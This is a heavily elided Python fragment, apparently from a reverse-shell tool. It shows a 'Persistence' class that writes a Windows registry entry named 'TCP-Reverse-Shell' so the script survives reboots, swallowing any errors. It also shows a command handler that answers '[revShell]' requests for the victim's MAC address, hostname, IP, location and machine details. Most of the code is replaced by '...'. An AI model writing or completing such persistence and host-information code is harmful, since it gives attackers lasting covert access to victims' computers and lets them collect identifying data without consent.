...
class Persistence:
    ...
    def add_reg(self):
        try:
            addr = r'c:/desktop/TCP-Reverse-Shell.py'
            ...
            winreg.SetValueEx(key, 'TCP-Reverse-Shell', 0, winreg.REG_SZ, addr)
            winreg.CloseKey(key)
        except:
            pass
        ...
        try:
            ...
            if msg[:5] == 'data.':
                ...
                if msg[:10] == 'data.mac':
                    ...
                    self.send_msg('[revShell] No data command in that name. options: mac, hostname, ip, location, machine, core')
